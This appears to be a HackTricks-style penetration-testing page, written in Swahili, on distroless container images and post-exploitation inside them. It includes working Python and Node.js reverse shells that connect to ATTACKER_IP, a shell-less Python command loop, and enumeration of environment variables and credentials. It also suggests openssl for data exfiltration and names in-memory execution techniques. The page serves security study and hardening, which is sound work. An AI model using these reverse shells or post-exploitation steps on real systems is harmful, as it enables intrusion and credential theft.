# Distroless Kontena

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Picha ya kontena ya **distroless** ni image inayobeba **vifaa vya wakati-runotarajiwa vya kiwango cha chini vinavyohitajika kuendesha programu moja maalum**, huku kwa makusudi ikiondoa zana za kawaida za distribution kama wasimamizi wa vifurushi, shell, na seti kubwa za utiliti za userland za jumla. Kwa vitendo, distroless images mara nyingi zina tu binary ya programu au runtime, maktaba zake zilizoshirikiwa, bundles za vyeti, na muundo mdogo wa filesystem.

Sio suala kwamba distroless ni primitive mpya ya izolisho ya kernel. Distroless ni **mkakati wa kubuni image**. Inabadilisha kile kilichopatikana **ndani** ya filesystem ya kontena, si jinsi kernel inavyotenganisha kontena. Tofauti hiyo ni muhimu, kwa sababu distroless huimarisha mazingira hasa kwa kupunguza kile mshambuliaji anaweza kutumia baada ya kupata code execution. Haiwezi kuchukua nafasi ya namespaces, seccomp, capabilities, AppArmor, SELinux, au mekanismo mwingine wowote wa izolisho wa runtime.

## Kwa Nini Distroless Ipo

Distroless images hutumika hasa kupunguza:

- ukubwa wa image
- ugumu wa uendeshaji wa image
- idadi ya vifurushi na binaries ambazo zinaweza kuwa na udhaifu
- idadi ya zana za post-exploitation zinazopatikana kwa mshambulizi kwa default

Hiyo ndiyo sababu distroless images zinapendwa katika deployments za aplikasi za uzalishaji. Kontena lisilo na shell, bila msimamizi wa vifurushi, na karibu bila zana za jumla kawaida ni rahisi kueleweka kwa upande wa uendeshaji na ngumu kutumiwa kwa njia ya kuingiliana baada ya kuathiriwa.

Mifano ya familia za image za mtindo wa distroless zilizojulikana ni pamoja na:

- Google's distroless images
- Chainguard hardened/minimal images

## Nini Distroless Si

Kontena ya distroless **sio**:

- automatically rootless
- automatically non-privileged
- automatically read-only
- automatically protected by seccomp, AppArmor, or SELinux
- automatically safe from container escape

Bado inawezekana kuendesha distroless image ukiwa na `--privileged`, sharing ya host namespace, bind mounts zenye hatari, au socket ya runtime iliyopakiwa. Katika hali hiyo, image inaweza kuwa minimal, lakini kontena bado unaweza kuwa hatari sana. Distroless inabadilisha uso wa shambulio wa **userland**, si **mk_boundary ya kuaminika wa kernel**.

## Tabia za Kawaida za Uendeshaji

Unapoathiri kontena ya distroless, jambo la kwanza unaloliona mara nyingi ni kwamba dhana za kawaida hazizuishi tena. Huenda hakuna `sh`, hakuna `bash`, hakuna `ls`, hakuna `id`, hakuna `cat`, na wakati mwingine hata mazingira yanayotegemea libc yasiyofanya kazi kama tradecraft yako inavyotarajia. Hii inaathiri pande zote mbili, ofensivu na difensi, kwa sababu ukosefu wa zana hufanya debugging, incident response, na post-exploitation kuwa tofauti.

Mifumo inayojitokeza mara kwa mara ni:

- runtime ya programu ipo, lakini karibu hakuna kitu kingine
- payloads zinazotegemea shell zinashindwa kwa sababu hakuna shell
- one-liners za kawaida za enumeration zinashindwa kwa sababu helper binaries hazipo
- ulinzi wa filesystem kama read-only rootfs au `noexec` kwenye maeneo ya tmpfs yanayoweza kuandikwa mara nyingi pia huwa yapo

Mchanganyiko huo ndio mara nyingi unasababisha watu kuzungumzia "weaponizing distroless".

## Distroless na Post-Exploitation

Changamoto kuu ya ofensivu katika mazingira ya distroless si mara zote RCE ya mwanzo. Mara nyingi ni kile kinachofuata. Ikiwa workload iliyothibitishwa inatoa code execution katika runtime ya lugha kama Python, Node.js, Java, au Go, unaweza kuweza kutekeleza mantiki yoyote, lakini si kupitia workflows za kawaida zinazotegemea shell ambazo ni za kawaida kwa targets nyingine za Linux.

Hii inamaanisha post-exploitation mara nyingi inabadilika kwenda moja ya mwelekeo mitatu:

1. **Tumia runtime ya lugha iliyopo moja kwa moja** kuorodhesha mazingira, kufungua sockets, kusoma faili, au kuandaa payloads za ziada.
2. **Lete zana zako ndani ya memory** ikiwa filesystem ni read-only au maeneo yanayoweza kuandikwa yamepakiwa `noexec`.
3. **Tumia vibaya binaries zilizopo tayari katika image** ikiwa programu au utegemezi wake unajumuisha kitu kisichotarajiwa kuwa muhimu.

## Matumizi Mabaya

### Orodhesha Runtime Uliyonayo

Katika kontena nyingi za distroless hakuna shell, lakini bado kuna runtime ya programu. Ikiwa lengo ni huduma ya Python, Python ipo. Ikiwa lengo ni Node.js, Node ipo. Hilo mara nyingi hutoa kazi ya kutosha kuorodhesha faili, kusoma variables za mazingira, kufungua reverse shells, na kuandaa utekelezaji ndani ya memory bila kamwe kuitisha `/bin/sh`.

Mfano rahisi kwa Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Mfano rahisi kwa Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Athari:

- Urejeshaji wa environment variables, mara nyingi ikiwa ni pamoja na credentials au service endpoints
- filesystem enumeration bila `/bin/ls`
- Utambuzi wa writable paths na mounted secrets

### Reverse Shell Bila `/bin/sh`

Ikiwa image haijumuishi `sh` au `bash`, classic shell-based reverse shell inaweza kushindwa mara moja. Katika hali hiyo, tumia installed language runtime badala yake.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Ikiwa `/bin/sh` haipo, badilisha mstari wa mwisho kwa utekelezaji wa amri moja kwa moja unaoendeshwa na Python au mzunguko wa REPL wa Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Tena, ikiwa `/bin/sh` haipo, tumia Node's filesystem, process, and networking APIs moja kwa moja badala ya kuanzisha shell.

### Mfano Kamili: No-Shell Python Command Loop

Ikiwa image ina Python lakini haina shell kabisa, mzunguko rahisi wa kuingiliana mara nyingi unatosha kudumisha uwezo kamili wa post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Hii haihitaji binary ya shell ya kuingiliana. Athari zake ni karibu sawa na shell ya msingi kwa mtazamo wa mshambulizi: utekelezaji wa amri, uorodheshaji, na kuandaa payloads zaidi kupitia runtime iliyopo.

### Utekelezaji wa Zana Ndani ya Kumbukumbu

Distroless images mara nyingi huhusishwa na:

- `readOnlyRootFilesystem: true`
- writable lakini `noexec` tmpfs kama `/dev/shm`
- ukosefu wa zana za usimamizi wa vifurushi

Muungano huo hufanya taratibu za kawaida za "kupakua binary kwenye diski na kuikimbiza" zisitegemewe. Katika kesi hizo, mbinu za utekelezaji ndani ya kumbukumbu zinakuwa jibu kuu.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Mbinu zinazofaa zaidi hapo ni:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binaries zilizopo tayari ndani ya image

Baadhi ya distroless images bado zina binaries muhimu kwa uendeshaji ambazo zinakuwa za manufaa baada ya ukombozi. Mfano unaoonekana mara kwa mara ni `openssl`, kwa sababu programu zinaweza kuhitaji kwa kazi zinazohusiana na crypto au TLS.

Mfano wa utafutaji wa haraka ni:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` ipo, inaweza kutumika kwa:

- miunganisho ya TLS yanayotoka nje
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

Matumizi mabaya halisi yanategemea kile kilichowekwa, lakini dhana kuu ni kwamba distroless haimaanishi "no tools whatsoever"; inamaanisha "far fewer tools than a normal distribution image".

## Mikaguzi

Lengo la mikaguzi hii ni kubaini kama image ni kweli distroless kwa vitendo na ni runtime au helper binaries zipi bado zinapatikana kwa post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Kinachovutia hapa:

- Ikiwa hakuna shell lakini runtime kama Python au Node ipo, post-exploitation inapaswa kuhamia kwa runtime-driven execution.
- Ikiwa root filesystem ni read-only na `/dev/shm` ni writable lakini `noexec`, mbinu za memory execution zinakuwa muhimu zaidi.
- Ikiwa binaries za msaada kama `openssl`, `busybox`, au `java` zipo, zinaweza kutoa utendaji wa kutosha kuanzisha upatikanaji zaidi.

## Chaguo-msingi za Runtime

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Userland ndogo kwa kusudi | Hakuna shell, hakuna package manager, tu application/runtime dependencies | kuongeza debugging layers, sidecar shells, kunakili busybox au tooling |
| Chainguard minimal images | Userland ndogo kwa kusudi | Package surface iliyopunguzwa, mara nyingi ikilenga runtime au service moja | kutumia `:latest-dev` au debug variants, kunakili tools wakati wa build |
| Kubernetes workloads using distroless images | Inategemea Pod config | Distroless inaathiri userland tu; Pod security posture bado inategemea Pod spec na runtime defaults | kuongeza ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Inategemea run flags | Filesystem ndogo, lakini runtime security bado inategemea flags na daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Hoja kuu ni kwamba distroless ni **sifa ya image**, si ulinzi wa runtime. Thamani yake inatokana na kupunguza yale yanayopatikana ndani ya filesystem baada ya compromise.

## Kurasa zinazohusiana

Kwa njia za kuzunguka filesystem na memory-execution zinazohitajika mara kwa mara katika mazingira ya distroless:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Kwa matumizi mabaya ya container runtime, socket, na mount ambayo bado yanahusiana na workloads za distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
